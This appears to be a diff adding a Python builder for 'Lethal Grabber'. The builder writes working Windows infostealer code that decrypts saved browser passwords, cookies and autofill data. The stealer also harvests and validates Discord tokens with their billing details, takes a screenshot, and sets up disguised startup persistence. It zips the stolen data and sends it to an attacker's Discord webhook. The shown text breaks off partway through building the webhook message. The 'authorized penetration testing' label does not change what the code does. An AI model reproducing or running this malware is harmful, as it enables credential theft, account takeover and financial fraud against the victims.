@@ -1,0 +1,930 @@
+"""
+Lethal Grabber Builder - Installs dependencies, configures webhook, builds the exe
+"""
+import os
+import sys
+import subprocess
+import json
+import tempfile
+import shutil
+
+BANNER = r"""
+╔══════════════════════════════════════════════════════╗
+║                                                      ║
+║    _       _____ _     _       ____                  ║
+║   | |     / ____| |   | |     / __ \                 ║
+║   | |    | |    | |__ | |__  | |  | |_ __ ___  ___   ║
+║   | |    | |    | '_ \| '_ \ | |  | | '__/ _ \/ __|  ║
+║   | |____| |____| | | | |_) || |__| | | |  __/\__ \  ║
+║   |______|\_____|_| |_|_.__/  \____/|_|  \___||___/  ║
+║                                                      ║
+║            💀 Browser Data Extraction Tool 💀         ║
+╚══════════════════════════════════════════════════════╝
+"""
+
+
+def print_color(text, color_code=92):
+    print(f"\033[{color_code}m{text}\033[0m")
+
+
+def install_dependencies():
+    """Install required packages"""
+    print_color("[+] Checking and installing dependencies...", 93)
+    packages = ['pywin32', 'requests', 'pyinstaller']
+    
+    for pkg in packages:
+        print_color(f"    Installing {pkg}...", 94)
+        try:
+            subprocess.check_call(
+                [sys.executable, '-m', 'pip', 'install', '--quiet', pkg],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            print_color(f"    ✓ {pkg} installed", 92)
+        except:
+            print_color(f"    ✗ Failed to install {pkg}", 91)
+            return False
+    
+    return True
+
+
+def create_grabber_script(webhook_url):
+    """Write the grabber.py file with the webhook embedded"""
+    
+    script_content = r'''"""
+Lethal Grabber - Authorized Penetration Testing Tool
+Extracts: Passwords, Autofills, Cookies, Discord Tokens, Screenshot
+All delivered in a single ZIP to Discord webhook
+"""
+import os
+import re
+import json
+import base64
+import sqlite3
+import shutil
+import tempfile
+import zipfile
+import sys
+import winreg
+import struct
+import io
+import ctypes
+from datetime import datetime
+from pathlib import Path
+
+import requests
+import win32crypt
+import win32gui
+import win32ui
+import win32con
+import win32api
+import win32file
+import win32security
+import win32process
+
+WEBHOOK_URL = "''' + webhook_url + '''"
+GRABBER_NAME = "Lethal Grabber"
+
+LOCAL = os.getenv('LOCALAPPDATA', '')
+ROAMING = os.getenv('APPDATA', '')
+USER = os.getenv('USERPROFILE', '')
+
+CHROMIUM_BROWSERS = {
+    'Chrome':         os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
+    'Chrome Beta':    os.path.join(LOCAL, 'Google', 'Chrome Beta', 'User Data'),
+    'Chrome Dev':     os.path.join(LOCAL, 'Google', 'Chrome Dev', 'User Data'),
+    'Chrome SxS':     os.path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
+    'Edge':           os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
+    'Brave':          os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
+    'Brave Beta':     os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser-Beta', 'User Data'),
+    'Brave Nightly':  os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser-Nightly', 'User Data'),
+    'Opera':          os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
+    'Opera GX':       os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
+    'Opera GX 2':     os.path.join(ROAMING, 'Opera Software', 'Opera GX'),
+    'Yandex':         os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data'),
+    'Vivaldi':        os.path.join(LOCAL, 'Vivaldi', 'User Data'),
+    'Chromium':       os.path.join(LOCAL, 'Chromium', 'User Data'),
+    'CocCoc':         os.path.join(LOCAL, 'CocCoc', 'Browser', 'User Data'),
+    'Avast':          os.path.join(LOCAL, 'AVAST Software', 'Browser', 'User Data'),
+    'AVG':            os.path.join(LOCAL, 'AVG', 'Browser', 'User Data'),
+    'Iridium':        os.path.join(LOCAL, 'Iridium', 'User Data'),
+    'Slimjet':        os.path.join(LOCAL, 'Slimjet', 'User Data'),
+    'Kinza':          os.path.join(LOCAL, 'Kinza', 'User Data'),
+    'Sputnik':        os.path.join(LOCAL, 'Sputnik', 'Sputnik', 'User Data'),
+    'Torch':          os.path.join(LOCAL, 'Torch', 'User Data'),
+    'Comodo Dragon':  os.path.join(LOCAL, 'Comodo', 'Dragon', 'User Data'),
+    '360 Browser':    os.path.join(LOCAL, '360Chrome', 'Chrome', 'User Data'),
+    'Blisk':          os.path.join(LOCAL, 'Blisk', 'User Data'),
+    'CentBrowser':    os.path.join(LOCAL, 'CentBrowser', 'User Data'),
+    'Chedot':         os.path.join(LOCAL, 'Chedot', 'User Data'),
+    'Epic Privacy':   os.path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
+    'Samsung':        os.path.join(LOCAL, 'Samsung', 'Internet', 'User Data'),
+    'Naver Whale':    os.path.join(LOCAL, 'Naver', 'Naver Whale', 'User Data'),
+    'QQ Browser':     os.path.join(LOCAL, 'Tencent', 'QQBrowser', 'User Data'),
+    'Sogou':          os.path.join(LOCAL, 'SogouExplorer', 'User Data'),
+    'Maxthon':        os.path.join(LOCAL, 'Maxthon', 'User Data'),
+    'Xvast':          os.path.join(LOCAL, 'Xvast', 'User Data'),
+    'Mozilla Firefox': os.path.join(ROAMING, 'Mozilla', 'Firefox', 'Profiles'),
+}
+
+DISCORD_PATHS = {
+    'Discord':        os.path.join(ROAMING, 'discord'),
+    'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
+    'Discord PTB':    os.path.join(ROAMING, 'discordptb'),
+    'Discord Dev':    os.path.join(ROAMING, 'discorddevelopment'),
+    'Lightcord':      os.path.join(ROAMING, 'Lightcord'),
+}
+
+BROWSER_LEVELDB_PATHS = {
+    'Chrome':         os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
+    'Edge':           os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
+    'Brave':          os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
+    'Opera':          os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
+    'Opera GX':       os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
+    'Yandex':         os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data'),
+    'Vivaldi':        os.path.join(LOCAL, 'Vivaldi', 'User Data'),
+}
+
+
+class LethalGrabber:
+    def __init__(self):
+        self.temp_dir = tempfile.mkdtemp(prefix='lg_')
+        self.creds_dir = os.path.join(self.temp_dir, 'Credentials')
+        self.messenger_dir = os.path.join(self.creds_dir, 'Messenger')
+        self.zip_path = os.path.join(self.temp_dir, 'LethalGrabber.zip')
+        os.makedirs(self.creds_dir, exist_ok=True)
+        os.makedirs(self.messenger_dir, exist_ok=True)
+        
+        self.passwords = []
+        self.autofills = []
+        self.cookies = []
+        self.discord_tokens = []
+        self.system_info = self.get_system_info()
+        
+        self.all_tokens_set = set()
+
+    @staticmethod
+    def get_system_info():
+        try:
+            info = {
+                'computer': os.getenv('COMPUTERNAME', 'N/A'),
+                'user': os.getenv('USERNAME', 'N/A'),
+                'os': os.getenv('OS', 'N/A'),
+                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            }
+            try:
+                info['ip'] = requests.get('https://api.ipify.org', timeout=5).text
+            except:
+                info['ip'] = 'Unavailable'
+            try:
+                info['hwid'] = subprocess_check_output(['wmic','csproduct','get','uuid']).decode().split('\\n')[1].strip()
+            except:
+                info['hwid'] = 'N/A'
+            return info
+        except:
+            return {'computer':'N/A','user':'N/A','os':'N/A','time':'N/A','ip':'N/A','hwid':'N/A'}
+
+    def install_startup(self):
+        try:
+            exe_path = sys.executable
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
+                    winreg.SetValueEx(key, 'WindowsSecurityUpdate', 0, winreg.REG_SZ, exe_path)
+            except: pass
+            startup = os.path.join(os.getenv('APPDATA'),
+                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdateCheck.bat')
+            with open(startup, 'w') as f:
+                f.write(f'@echo off\\nstart "" "{exe_path}"\\n')
+        except: pass
+
+    @staticmethod
+    def _aes_encrypt_block(key, plaintext):
+        sbox = [
+            0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
+            0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
+            0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
+            0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
+            0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
+            0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
+            0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x6c,0x85,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,
+            0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,
+            0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,
+            0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,
+            0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,
+            0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,
+            0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,
+            0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,
+            0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,
+            0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
+        ]
+        def _expand_key(key):
+            rcon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
+            nk = len(key)//4
+            w = [struct.unpack('>I',key[4*i:4*i+4])[0] for i in range(nk)]
+            for i in range(nk, 4*(nk+6+1)):
+                t = w[i-1]
+                if i%nk==0:
+                    t = (sbox[(t>>16)&0xff]<<24)|(sbox[(t>>8)&0xff]<<16)|(sbox[t&0xff]<<8)|sbox[t>>24]
+                    t ^= rcon[i//nk-1]<<24
+                elif nk>6 and i%nk==4:
+                    t = (sbox[(t>>24)&0xff]<<24)|(sbox[(t>>16)&0xff]<<16)|(sbox[(t>>8)&0xff]<<8)|sbox[t&0xff]
+                w.append(w[i-nk]^t)
+            return w, nk+6
+        def _sb(st): return [sbox[b] for b in st]
+        def _sr(st): return [st[0],st[5],st[10],st[15],st[4],st[9],st[14],st[3],st[8],st[13],st[2],st[7],st[12],st[1],st[6],st[11]]
+        def _mc(st):
+            def gm(a,b):
+                p=0
+                for _ in range(8):
+                    if b&1: p^=a
+                    h=a&0x80;a=(a<<1)&0xff
+                    if h: a^=0x1b
+                    b>>=1
+                return p
+            r=st[:]
+            for i in range(4):
+                r[i*4]=gm(2,st[i*4])^gm(3,st[i*4+1])^st[i*4+2]^st[i*4+3]
+                r[i*4+1]=st[i*4]^gm(2,st[i*4+1])^gm(3,st[i*4+2])^st[i*4+3]
+                r[i*4+2]=st[i*4]^st[i*4+1]^gm(2,st[i*4+2])^gm(3,st[i*4+3])
+                r[i*4+3]=gm(3,st[i*4])^st[i*4+1]^st[i*4+2]^gm(2,st[i*4+3])
+            return r
+        def _ark(st,rk):
+            res=[]
+            for i in range(16):
+                res.append(st[i]^((rk[i//4]>>(24-((i%4)*8)))&0xff))
+            return res
+        w,nr=_expand_key(key)
+        st=_ark(list(plaintext),w[0:4])
+        for rnd in range(1,nr):
+            st=_ark(_mc(_sr(_sb(st))),w[rnd*4:(rnd+1)*4])
+        st=_ark(_sr(_sb(st)),w[nr*4:(nr+1)*4])
+        return bytes(st)
+
+    def _aes_gcm_decrypt(self, key, nonce, ct, tag, aad=b''):
+        h = self._aes_encrypt_block(key, b'\\x00'*16)
+        j0 = nonce + b'\\x00\\x00\\x00\\x01' if len(nonce)==12 else nonce
+        def _ghash(h, data):
+            if len(data)%16: data += b'\\x00'*(16-len(data)%16)
+            y=0
+            for i in range(0,len(data),16):
+                block=int.from_bytes(data[i:i+16],'big')
+                v=y^block
+                z=0
+                x=v
+                y2=h
+                r=0xe1000000000000000000000000000000
+                for _ in range(128):
+                    if (x>>(127-_))&1: z^=y2
+                    if y2&1: y2=(y2>>1)^r
+                    else: y2>>=1
+                y=z
+            return y
+        eko=self._aes_encrypt_block(key,j0)
+        ghash_in = aad+ct+struct.pack('>Q',len(aad)*8)+struct.pack('>Q',len(ct)*8)
+        ghash_val = _ghash(h, ghash_in)
+        tag_bytes=struct.pack('>Q', ghash_val>>64) + struct.pack('>Q', ghash_val&((1<<64)-1))
+        tag_check=bytes(a^b for a,b in zip(tag_bytes,eko[:len(tag_bytes)]))
+        if tag[:len(tag_check)]!=tag_check: return None
+        pt=b''
+        cnt=list(j0)
+        for i in range(0,len(ct),16):
+            ctr_val=struct.unpack('>Q',bytes(cnt[4:12]))[0]+1
+            cnt=bytes(cnt[:12])+struct.pack('>Q',ctr_val)
+            ek=self._aes_encrypt_block(key,cnt)
+            blk=ct[i:i+16]
+            pt+=bytes(a^b for a,b in zip(blk,ek[:len(blk)]))
+        return pt
+
+    def get_chromium_master_key(self, browser_path):
+        ls = os.path.join(browser_path, 'Local State')
+        if not os.path.exists(ls): return None
+        try:
+            with open(ls,'r',encoding='utf-8') as f:
+                st = json.load(f)
+            ek = base64.b64decode(st['os_crypt']['encrypted_key'])
+            if ek[:5]==b'DPAPI': ek = ek[5:]
+            return win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
+        except: return None
+
+    def decrypt_data(self, data, mk):
+        if not mk or not data: return None
+        try:
+            if isinstance(data, str):
+                data = base64.b64decode(data)
+            if data[:3] in (b'v10',b'v11'):
+                nonce = data[3:15]
+                ct = data[15:-16]
+                tag = data[-16:]
+                r = self._aes_gcm_decrypt(mk, nonce, ct, tag)
+                return r.decode('utf-8','replace') if r else None
+            else:
+                p = win32crypt.CryptUnprotectData(data,None,None,None,0)[1]
+                return p.decode('utf-8','replace') if p else None
+        except:
+            try:
+                p = win32crypt.CryptUnprotectData(data,None,None,None,0)[1]
+                return p.decode('utf-8','replace') if p else None
+            except: return None
+
+    def get_profiles(self, bp):
+        profs = []
+        try:
+            for e in sorted(os.listdir(bp)):
+                if e == 'Default' or e.startswith('Profile '):
+                    fp = os.path.join(bp, e)
+                    if os.path.isdir(fp): profs.append(e)
+        except: pass
+        if not profs: profs = ['Default']
+        return profs
+
+    def extract_passwords(self):
+        for bname, bpath in CHROMIUM_BROWSERS.items():
+            if not os.path.exists(bpath): continue
+            mk = self.get_chromium_master_key(bpath)
+            for prof in self.get_profiles(bpath):
+                dbp = os.path.join(bpath, prof, 'Login Data')
+                if not os.path.exists(dbp): continue
+                try:
+                    tdb = os.path.join(self.temp_dir, f'pw_{bname}_{prof}.db')
+                    shutil.copy2(dbp, tdb)
+                    conn = sqlite3.connect(tdb)
+                    c = conn.cursor()
+                    try:
+                        c.execute('SELECT origin_url,username_value,password_value FROM logins')
+                        for r in c.fetchall():
+                            url, uname, epwd = r
+                            if not uname and not epwd: continue
+                            pwd = self.decrypt_data(epwd, mk)
+                            if uname or pwd:
+                                self.passwords.append(f"[{bname}][{prof}] {url}\\n  Username: {uname}\\n  Password: {pwd}\\n")
+                    except: pass
+                    c.close(); conn.close(); os.remove(tdb)
+                except:
+                    try: os.remove(tdb)
+                    except: pass
+
+    def extract_autofills(self):
+        for bname, bpath in CHROMIUM_BROWSERS.items():
+            if not os.path.exists(bpath): continue
+            for prof in self.get_profiles(bpath):
+                wdp = os.path.join(bpath, prof, 'Web Data')
+                if not os.path.exists(wdp): continue
+                try:
+                    tdb = os.path.join(self.temp_dir, f'af_{bname}_{prof}.db')
+                    shutil.copy2(wdp, tdb)
+                    conn = sqlite3.connect(tdb)
+                    c = conn.cursor()
+                    try:
+                        c.execute('SELECT name,value FROM autofill')
+                        for r in c.fetchall():
+                            self.autofills.append(f"[{bname}][{prof}] Field: {r[0]} = {r[1]}\\n")
+                    except: pass
+                    try:
+                        c.execute("SELECT name_on_card,expiration_month,expiration_year FROM credit_cards")
+                        for r in c.fetchall():
+                            self.autofills.append(f"[{bname}][{prof}] CC: {r[0]} | Exp: {r[1]}/{r[2]}\\n")
+                    except: pass
+                    c.close(); conn.close(); os.remove(tdb)
+                except:
+                    try: os.remove(tdb)
+                    except: pass
+
+    def extract_cookies(self):
+        for bname, bpath in CHROMIUM_BROWSERS.items():
+            if not os.path.exists(bpath): continue
+            mk = self.get_chromium_master_key(bpath)
+            for prof in self.get_profiles(bpath):
+                ckp = os.path.join(bpath, prof, 'Network', 'Cookies')
+                if not os.path.exists(ckp):
+                    ckp = os.path.join(bpath, prof, 'Cookies')
+                    if not os.path.exists(ckp): continue
+                try:
+                    tdb = os.path.join(self.temp_dir, f'ck_{bname}_{prof}.db')
+                    shutil.copy2(ckp, tdb)
+                    conn = sqlite3.connect(tdb)
+                    c = conn.cursor()
+                    c.execute('SELECT host_key,name,path,encrypted_value,expires_utc FROM cookies')
+                    for r in c.fetchall():
+                        host,nm,pth,ev = r[0],r[1],r[2],r[3]
+                        if not ev: continue
+                        val = None
+                        if mk: val = self.decrypt_data(ev, mk)
+                        if val:
+                            self.cookies.append(f"[{bname}][{prof}] {host}{pth} | {nm} = {val[:250]}\\n")
+                    c.close(); conn.close(); os.remove(tdb)
+                except:
+                    try: os.remove(tdb)
+                    except: pass
+
+    def extract_firefox_data(self):
+        """Extract Firefox logins.json"""
+        fp = os.path.join(ROAMING, 'Mozilla', 'Firefox', 'Profiles')
+        if not os.path.exists(fp): return
+        try:
+            for prof in os.listdir(fp):
+                prof_path = os.path.join(fp, prof)
+                if not os.path.isdir(prof_path): continue
+                # Firefox logins.json
+                lj = os.path.join(prof_path, 'logins.json')
+                if os.path.exists(lj):
+                    try:
+                        with open(lj, 'r', encoding='utf-8') as f:
+                            data = json.load(f)
+                        for entry in data.get('logins', []):
+                            url = entry.get('hostname', '')
+                            uname = entry.get('encryptedUsername', '')
+                            pwd = entry.get('encryptedPassword', '')
+                            self.passwords.append(f"[Firefox][{prof}] {url}\\n  Username: [encrypted: {uname[:40]}...]\\n  Password: [encrypted: {pwd[:40]}...]\\n")
+                    except: pass
+        except: pass
+
+    def extract_discord_tokens_from_leveldb(self, base_path, source_name):
+        """Extract tokens from a LevelDB directory"""
+        ldb = os.path.join(base_path, 'Local Storage', 'leveldb')
+        if not os.path.exists(ldb): return
+        
+        tre = re.compile(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}')
+        encrypted_re = re.compile(r'dQw4w9WgXcQ:([^\\"\\\\]+)')
+        
+        try:
+            for fn in os.listdir(ldb):
+                if not fn.endswith('.log') and not fn.endswith('.ldb'):
+                    continue
+                try:
+                    fpath = os.path.join(ldb, fn)
+                    with open(fpath, 'r', errors='ignore') as f:
+                        content = f.read()
+                    
+                    for match in tre.findall(content):
+                        if match not in self.all_tokens_set:
+                            self.all_tokens_set.add(match)
+                            self.discord_tokens.append({'source': source_name, 'token': match, 'encrypted': False})
+                    
+                    mk = None
+                    for bname, bpath in CHROMIUM_BROWSERS.items():
+                        if bpath and bpath in base_path:
+                            mk = self.get_chromium_master_key(bpath)
+                            break
+                    
+                    for match in encrypted_re.findall(content):
+                        try:
+                            raw = base64.b64decode(match)
+                            decrypted = self.decrypt_data(raw, mk) if mk else None
+                            if decrypted and decrypted not in self.all_tokens_set:
+                                self.all_tokens_set.add(decrypted)
+                                self.discord_tokens.append({'source': source_name, 'token': decrypted, 'encrypted': True})
+                        except:
+                            pass
+                except:
+                    continue
+        except:
+            pass
+
+    def extract_discord_from_browsers(self):
+        """Extract Discord tokens from all browser leveldb directories"""
+        for bname, bpath in BROWSER_LEVELDB_PATHS.items():
+            if not os.path.exists(bpath): continue
+            for prof in self.get_profiles(bpath):
+                prof_path = os.path.join(bpath, prof)
+                self.extract_discord_tokens_from_leveldb(prof_path, f"Web {bname}")
+
+    def extract_all_discord_tokens(self):
+        """Main Discord token extraction"""
+        for cname, cpath in DISCORD_PATHS.items():
+            if os.path.exists(cpath):
+                self.extract_discord_tokens_from_leveldb(cpath, cname)
+        
+        self.extract_discord_from_browsers()
+
+    def validate_token(self, token):
+        try:
+            r = requests.get('https://discord.com/api/v9/users/@me',
+                headers={'Authorization':token}, timeout=5)
+            if r.status_code==200: return r.json()
+        except: pass
+        return None
+
+    def get_billing(self, token):
+        try:
+            r = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources',
+                headers={'Authorization':token}, timeout=5)
+            if r.status_code==200:
+                methods = r.json()
+                if methods:
+                    types = {'1':'Card','2':'PayPal','3':'Venmo','4':'CashApp','5':'Samsung Pay','7':'Google Pay'}
+                    return ', '.join([f"{types.get(str(m.get('type','?')),'?')} ({m.get('id','')[:4]})" for m in methods])
+                return '(No Payment Method)'
+        except: pass
+        return '(No Payment Method)'
+
+    def get_gift_codes(self, token):
+        try:
+            r = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes',
+                headers={'Authorization':token}, timeout=5)
+            if r.status_code==200:
+                codes = r.json()
+                if codes:
+                    return '\\n'.join([f"  {c.get('code','?')} - {c.get('promotion','?')}" for c in codes])
+        except: pass
+        return '(NONE)'
+
+    def get_user_guilds(self, token):
+        try:
+            r = requests.get('https://discord.com/api/v9/users/@me/guilds',
+                headers={'Authorization':token}, timeout=5)
+            if r.status_code==200:
+                guilds = r.json()
+                return ', '.join([g.get('name','?') for g in guilds[:10]])
+        except: pass
+        return 'N/A'
+
+    def get_friends_count(self, token):
+        try:
+            r = requests.get('https://discord.com/api/v9/users/@me/relationships',
+                headers={'Authorization':token}, timeout=5)
+            if r.status_code==200: return len(r.json())
+        except: pass
+        return 'N/A'
+
+    def take_screenshot(self):
+        try:
+            hwnd = win32gui.GetDesktopWindow()
+            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+
+            hdc = win32gui.GetWindowDC(hwnd)
+            srcdc = win32ui.CreateDCFromHandle(hdc)
+            memdc = srcdc.CreateCompatibleDC()
+            
+            bmp = win32ui.CreateBitmap()
+            bmp.CreateCompatibleBitmap(srcdc, width, height)
+            memdc.SelectObject(bmp)
+            memdc.BitBlt((0,0), (width,height), srcdc, (left,top), win32con.SRCCOPY)
+            
+            bmp_info = bmp.GetInfo()
+            bmp_str = bmp.GetBitmapBits(True)
+            
+            bmp_header = b'BM'
+            file_size = 54 + len(bmp_str)
+            bmp_header += struct.pack('<I', file_size)
+            bmp_header += struct.pack('<HH', 0, 0)
+            bmp_header += struct.pack('<I', 54)
+            
+            dib_header = struct.pack('<I', 40)
+            dib_header += struct.pack('<i', bmp_info['bmWidth'])
+            dib_header += struct.pack('<i', bmp_info['bmHeight'])
+            dib_header += struct.pack('<H', 1)
+            dib_header += struct.pack('<H', bmp_info['bmBitsPixel'])
+            dib_header += struct.pack('<I', 0)
+            dib_header += struct.pack('<I', len(bmp_str))
+            dib_header += struct.pack('<i', 2835)
+            dib_header += struct.pack('<i', 2835)
+            dib_header += struct.pack('<I', 0)
+            dib_header += struct.pack('<I', 0)
+            
+            screenshot_path = os.path.join(self.temp_dir, 'screenshot.bmp')
+            with open(screenshot_path, 'wb') as f:
+                f.write(bmp_header + dib_header + bmp_str)
+            
+            win32gui.DeleteObject(bmp.GetHandle())
+            memdc.DeleteDC()
+            srcdc.DeleteDC()
+            win32gui.ReleaseDC(hwnd, hdc)
+            
+            return screenshot_path
+        except:
+            return None
+
+    def build_zip(self):
+        if self.passwords:
+            with open(os.path.join(self.creds_dir, 'passwords.txt'), 'w', encoding='utf-8') as f:
+                f.write("=== LETHAL GRABBER - EXTRACTED PASSWORDS ===\\n\\n")
+                f.write(''.join(self.passwords))
+        
+        if self.autofills:
+            with open(os.path.join(self.creds_dir, 'autofills.txt'), 'w', encoding='utf-8') as f:
+                f.write("=== LETHAL GRABBER - EXTRACTED AUTOFILL DATA ===\\n\\n")
+                f.write(''.join(self.autofills))
+        
+        cookie_path = os.path.join(self.creds_dir, 'cookies.txt')
+        with open(cookie_path, 'w', encoding='utf-8') as f:
+            f.write("=== LETHAL GRABBER - EXTRACTED COOKIES ===\\n\\n")
+            if self.cookies:
+                f.write(''.join(self.cookies))
+            else:
+                f.write("No cookies extracted.\\n")
+        
+        tk_path = os.path.join(self.messenger_dir, 'discord_tokens.txt')
+        with open(tk_path, 'w', encoding='utf-8') as f:
+            f.write("=== LETHAL GRABBER - DISCORD TOKENS ===\\n")
+            f.write(f"Total tokens found: {len(self.discord_tokens)}\\n")
+            f.write("="*60 + "\\n\\n")
+            
+            for idx, t in enumerate(self.discord_tokens, 1):
+                user_info = self.validate_token(t['token'])
+                f.write(f"--- Token #{idx} [Source: {t['source']}] ---\\n")
+                if user_info:
+                    username = f"{user_info.get('username','?')}#{user_info.get('discriminator','0')}"
+                    uid = user_info.get('id','?')
+                    mfa = 'Yes' if user_info.get('mfa_enabled') else 'No'
+                    email = user_info.get('email','(No Email)')
+                    phone_val = user_info.get('phone','(No Phone Number)')
+                    verified = 'Yes' if user_info.get('verified') else 'No'
+                    nitro_map = {0:'No Nitro',1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'}
+                    nitro = nitro_map.get(user_info.get('premium_type',0),'No Nitro')
+                    billing = self.get_billing(t['token'])
+                    gifts = self.get_gift_codes(t['token'])
+                    guilds = self.get_user_guilds(t['token'])
+                    friends = self.get_friends_count(t['token'])
+                    
+                    f.write(f"Username: {username}\\n")
+                    f.write(f"User ID: {uid}\\n")
+                    f.write(f"MFA enabled: {mfa}\\n")
+                    f.write(f"Email: {email}\\n")
+                    f.write(f"Phone: {phone_val}\\n")
+                    f.write(f"Verified: {verified}\\n")
+                    f.write(f"Nitro: {nitro}\\n")
+                    f.write(f"Billing Method(s): {billing}\\n")
+                    f.write(f"Friends: {friends}\\n")
+                    f.write(f"Guilds: {guilds}\\n")
+                    f.write(f"\\nToken: {t['token']}\\n")
+                    f.write(f"\\nGift Codes: {gifts}\\n")
+                else:
+                    f.write(f"Token: {t['token']} (INVALID/EXPIRED)\\n")
+                f.write("="*60 + "\\n\\n")
+        
+        shutil.copy2(tk_path, os.path.join(self.creds_dir, 'discord_tokens.txt'))
+        
+        ss_path = self.take_screenshot()
+        
+        with zipfile.ZipFile(self.zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+            if os.path.exists(self.creds_dir):
+                for root, dirs, files in os.walk(self.creds_dir):
+                    for fn in files:
+                        fp = os.path.join(root, fn)
+                        arcname = os.path.relpath(fp, self.temp_dir)
+                        zf.write(fp, arcname)
+            if ss_path and os.path.exists(ss_path):
+                zf.write(ss_path, 'screenshot.bmp')
+        
+        return self.zip_path
+
+    def send_to_webhook(self):
+        if not WEBHOOK_URL or WEBHOOK_URL == 'YOUR_WEBHOOK_URL_HERE':
+            return
+        
+        zip_path = self.build_zip()
+        if not os.path.exists(zip_path):
+            return
+        
+        try:
+            sys_info = self.system_info
+
+            valid_count = 0
+            first_valid = None
+            for t in self.discord_tokens[:10]:
+                try:
+                    r = requests.get('https://discord.com/api/v9/users/@me',
+                        headers={'Authorization': t['token']}, timeout=3)
+                    if r.status_code == 200:
+                        valid_count += 1
+                        if not first_valid:
+                            first_valid = {'data': r.json(), 'token': t['token'], 'source': t['source']}
+                except: pass
+
+            description_lines = [
+                f"```css\\n"
+                f"[ System Information ]\\n"
+                f"PC: {sys_info.get('computer','N/A')}\\n"
+                f"User: {sys_info.get('user','N/A')}\\n"
+                f"OS: {sys_info.get('os','N/A')}\\n"
+                f"IP: {sys_info.get('ip','N/A')}\\n"
+                f"HWID: {sys_info.get('hwid','N/A')}\\n"
+                f"```"
+            ]
+            
+            embed = {
+                "title": f"💀 **{GRABBER_NAME}** 💀",
+                "color": 0xFF1100,
+                "description": "\\n".join(description_lines),
+                "fields": [],
+                "thumbnail": {"url": "https://cdn.discordapp.com/icons/1121520721807155220/135a37a1b97a5cf314c75d8c8e3beb2d.png?size=128"},
+                "footer": {"text": f"{GRABBER_NAME} • Extracted: {sys_info.get('time','N/A')} • Data exfiltrated securely"},
+                "timestamp": datetime.utcnow().isoformat()
+            }
+
+            pw_count = len(self.passwords)
+            af_count = len(self.autofills)
+            ck_count = len(self.cookies)
+            tk_count = len(self.discord_tokens)
+            
+            embed["fields"].append({
+                "name": "📊 **Extraction Statistics**",
